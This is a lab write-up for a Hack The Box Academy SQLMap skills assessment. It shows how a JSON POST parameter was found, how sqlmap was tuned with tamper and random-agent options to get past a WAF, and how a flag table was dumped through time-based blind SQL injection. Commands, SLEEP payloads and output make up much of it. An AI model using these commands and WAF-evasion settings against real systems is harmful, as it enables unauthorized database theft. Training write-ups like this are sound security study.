# SQLMap Essentials — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** SQLMap Essentials  
**Assessment:** Skills Assessment  
**Difficulty:** Easy  
**OS:** Linux Debian 10 (Apache 2.4.38 + MySQL/MariaDB)  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Browse target — inspect all pages with Network tab open | POST request to `/action.php` discovered via “ADD TO CART +” button |
| 2 | Capture raw HTTP POST request — save to `request.req` | JSON body `{"id":1}` identified as injection point |
| 3 | SQLMap `-r request.req` with `--level 5 --risk 3 --random-agent --tamper=between --technique=t` | Time-based blind SQLi confirmed on JSON `id` parameter |
| 4 | `--dump` full database enumeration | Database `production` discovered with 5 tables including `final_flag` |
| 5 | `CTRL+C` mid-dump → targeted `-D production -T final_flag` | `final_flag` table contents retrieved — assessment flag captured |

---

## Question 1 — Dump the Contents of the `final_flag` Table

**Question:** “What’s the contents of table final_flag?”

---

### Step 1 — Browse the Target and Identify the Attack Surface

Navigate to `http://10.129.43.173:32150` with the Network tab of Firefox DevTools open (`F12 → Network`).

The homepage is a product catalogue. Click through every page and interact with every button while watching the Network tab for outgoing requests. Most navigation generates only GET requests. The critical POST request only appears when navigating to:

```
Catalog → Shop → Click “ADD TO CART +” on any item
```

The “ADD TO CART +” button is the only element on the entire application that sends a POST request — and therefore the only point where user-controlled input reaches the back-end server in a way that could interact with the database.

---

### Step 2 — Capture the Raw HTTP Request

In Firefox DevTools → Network tab, click the POST request to `/action.php`. Select the **Raw** view in the Request Headers pane and capture the full request including headers and body.

Save it to a file named `request.req`:

```bash
Hackerpatel007_1@htb[/htb]$ cat request.req
```

```http
POST /action.php HTTP/1.1
Host: 10.129.43.173:32150
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://10.129.43.173:32150
DNT: 1
Connection: keep-alive
Referer: http://10.129.43.173:32150/shop.html
Sec-GPC: 1

{"id":1}
```

> **Why save to a file:** The request uses a `Content-Type: application/json` body — a JSON POST body. Passing this via `--data` on the command line is error-prone and can cause encoding issues. Using `-r request.req` guarantees SQLMap receives the exact request the browser sends, including all headers and the correctly formatted JSON body.

---

### Step 3 — Initial SQLMap Run and Discovering Required Options

A basic run against the request file fails or returns no injection points. The application has protections that require tuning. Through trial and error — or by analysing the application’s behaviour — the following options are determined to be necessary:

| Option | Why It Is Needed |
|--------|------------------|
| `--level 5` | Extends the boundary set to 5 — uses the maximum range of prefix/suffix pairs to account for unusual query wrapping |
| `--risk 3` | Extends payload set to risk level 3 — enables OR-based and more aggressive payloads that would otherwise be skipped |
| `--random-agent` | Rotates User-Agent on every request — bypasses basic bot/scanner detection that blocks the default `sqlmap/` User-Agent |
| `--tamper=between` | Replaces `>` with `NOT BETWEEN 0 AND` and `=` with `BETWEEN x AND x` — bypasses WAF rules that block standard comparison operators |
| `--technique=t` | Restricts to Time-based blind only — the application filters or breaks on UNION/error-based payloads; only time-based reaches the database |

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r request.req --batch --dump \
  --level 5 --risk 3 --random-agent \
  --tamper=between \
  --technique=t
```

---

### Step 4 — SQLMap Confirms Time-Based Blind Injection

SQLMap processes the JSON body, identifies the `id` parameter, and confirms time-based blind injection:

```
[18:42:13] [INFO] parsing HTTP request from 'request.req'
[18:42:13] [INFO] loading tamper module 'between'
[18:42:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1)...'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:42:14] [INFO] resuming back-end DBMS 'mysql'
[18:42:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7108 FROM (SELECT(SLEEP(5)))iDXK)"}
---
```

**What this tells us:**
- The `id` field inside the JSON POST body is injectable
- The injection type is **time-based blind** — no data appears in the page output; SQLMap infers TRUE/FALSE by measuring whether the server delays its response by 5 seconds
- The DBMS is **MySQL >= 5.0.12**
- The tamper script `between` is converting the payload’s comparison operators to bypass WAF detection

---

### Step 5 — Database Enumeration — Identify the Target Table

SQLMap proceeds to enumerate the database structure via time-based blind injection. Because each bit of data requires a SLEEP-based request, this process is slow — each character takes several requests. The database names and table names trickle in:

```
[18:42:29] [INFO] adjusting time delay to 1 second due to good response times
production
[18:43:02] [INFO] fetching tables for database: 'production'
[18:43:02] [INFO] fetching number of tables for database 'production'
[18:43:02] [INFO] retrieved: 5
[18:43:04] [INFO] retrieved: categories
[18:43:31] [INFO] retrieved: brands
[18:43:49] [INFO] retrieved: products
[18:44:18] [INFO] retrieved: order_items
[18:44:55] [INFO] retrieved: final_flag
```

**Database:** `production`  
**Tables:** `categories`, `brands`, `products`, `order_items`, `final_flag`

The `final_flag` table is the assessment target. At this point, SQLMap is about to begin fetching columns from `order_items` — an irrelevant table. Interrupt the scan to avoid wasting time:

```
[18:45:29] [INFO] fetching columns for table 'order_items' in database 'production'
[18:45:29] [INFO] retrieved: ^C
```

Press `CTRL+C` to interrupt. SQLMap saves its session — all discovered information (database names, table names, injection point) is cached and will be resumed automatically on the next run.

---

### Step 6 — Targeted Dump of the `final_flag` Table

Re-run SQLMap with the same options but now explicitly target only the `final_flag` table in the `production` database using `-D` and `-T`:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r request.req --batch --dump \
  --level 5 --risk 3 --random-agent \
  --tamper=between \
  --technique=t \
  -D production -T final_flag
```

SQLMap resumes from its cached session, skipping re-detection:

```
[18:54:34] [INFO] parsing HTTP request from 'request.req'
[18:54:34] [INFO] loading tamper module 'between'
[18:54:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre)...'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:54:34] [INFO] testing connection to the target URL

sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7393 FROM (SELECT(SLEEP(5)))ZWNA)"}
---
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

SQLMap fetches the `final_flag` table structure and data:

```
[18:55:55] [INFO] retrieved: id
[18:56:01] [INFO] retrieved: content
[18:56:27] [INFO] fetching entries for table 'final_flag' in database 'production'
[18:56:27] [INFO] fetching number of entries for table 'final_flag' in database 'production'
[18:56:27] [INFO] retrieved: 1
```

The flag value is extracted one character at a time via SLEEP-based inference and assembled:

```
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{flag_redacted}       |
+----+--------------------------+
```

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 — `final_flag` table contents | Flag retrieved from `production.final_flag` via time-based blind SQLi | `HTB{flag_redacted}` |

---

## Lessons Learned

- **The only way to find the injectable endpoint is thorough manual application exploration.** Automated crawlers frequently miss JavaScript-triggered POST requests like “ADD TO CART” buttons. Always click through every page element manually with DevTools Network tab open — the injectable parameter is never where you expect it to be.

- **JSON POST bodies require a request file, not `--data`.** When the application sends `Content-Type: application/json`, the body is a structured JSON object. Passing it via `--data` on the command line can cause escaping issues. Using `-r request.req` guarantees SQLMap processes the exact request the browser sends, including the correctly formatted body and all required headers.

- **Default SQLMap options are insufficient against protected applications.** `--level 5 --risk 3` expands from 72 to 7,865 payloads per parameter — but alone they do not bypass WAF filtering. The `--tamper=between` script is the bypass that replaces blocked comparison operators with equivalent SQL functions. The `--technique=t` restriction prevents SQLMap from sending UNION or error-based payloads that the WAF would block, narrowing to the only working technique.

- **`--random-agent` is always worth adding against production targets.** The default SQLMap User-Agent (`sqlmap/1.x`) is trivially detectable and blocked by most WAFs and CDNs. Rotating to a random legitimate browser User-Agent eliminates this detection vector with no downside.

- **Interrupt early and target specifically — `CTRL+C` is a feature, not an error.** Time-based blind SQLi is extremely slow — each character requires multiple SLEEP-timed requests. As soon as the target table is identified, interrupt the broad dump and restart with `-D database -T table`. SQLMap’s session caching means no work is lost — the next run resumes from the saved injection point. Dumping `--dump-all` on a time-based target could run for hours.

- **Time-based blind SQLi is the injection type of last resort — but it always works.** When UNION and error-based are blocked by WAF rules, time-based blind bypasses all output-based filtering because it never reflects data in the HTTP response. The data is extracted purely through timing — invisible to content-based WAF rules.

---

## Full Attack Chain Reference

```
Browse http://10.129.43.173:32150 with DevTools Network tab open
        ↓
Catalog → Shop → “ADD TO CART +” → POST /action.php {"id":1} captured
        ↓
Save raw request to request.req
        ↓
sqlmap -r request.req --batch --dump --level 5 --risk 3
       --random-agent --tamper=between --technique=t
        ↓
JSON id parameter confirmed vulnerable — time-based blind
Payload: {"id":"1 AND (SELECT 7108 FROM (SELECT(SLEEP(5)))iDXK)"}
        ↓
Database enumerated: production
Tables: categories, brands, products, order_items, final_flag
        ↓
CTRL+C → interrupt before irrelevant tables dump
        ↓
sqlmap -r request.req --batch --dump --level 5 --risk 3
       --random-agent --tamper=between --technique=t
       -D production -T final_flag
        ↓
final_flag table: id=1 | content=HTB{flag_redacted}
```

---

## Commands Reference

| Command | Purpose |
|---------|----------|
| `F12 → Network tab → click “ADD TO CART +”` | Discover POST request to `/action.php` |
| `cat request.req` | Verify saved HTTP request file contents |
| `sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t` | Full discovery and dump run with WAF bypass options |
| `CTRL+C` | Interrupt SQLMap mid-run (session is saved — progress is not lost) |
| `sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag` | Targeted dump of specific database and table |
| `--level 5` | Expand boundary set to maximum (7,865 payloads total with --risk 3) |
| `--risk 3` | Enable aggressive payload set including OR-based payloads |
| `--random-agent` | Rotate random browser User-Agent per request to bypass bot detection |
| `--tamper=between` | Replace `>` / `=` operators with BETWEEN equivalents to bypass WAF |
| `--technique=t` | Restrict to time-based blind only — skip blocked UNION/error techniques |
| `-D production -T final_flag` | Target specific database and table for dump |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — time-based blind SQLi via JSON POST body on `/action.php` |
| T1005 | — | Data from Local System — dumping `production.final_flag` table via SQLMap `--dump` |
| T1027 | T1027.001 | Obfuscated Files or Information — `--tamper=between` obfuscating SQLi payloads to bypass WAF operator filtering |
| T1562 | T1562.001 | Impair Defences: Disable or Modify Tools — `--random-agent` evading User-Agent-based WAF/bot blocking |
| T1071 | T1071.001 | Application Layer Protocol: Web Protocols — all SQLMap traffic via HTTP POST to `/action.php` |

---

*Part of the HTB Academy CPTS path — SQLMap Essentials module.*  
*Penetration Tester role in India | Target: January 2027*
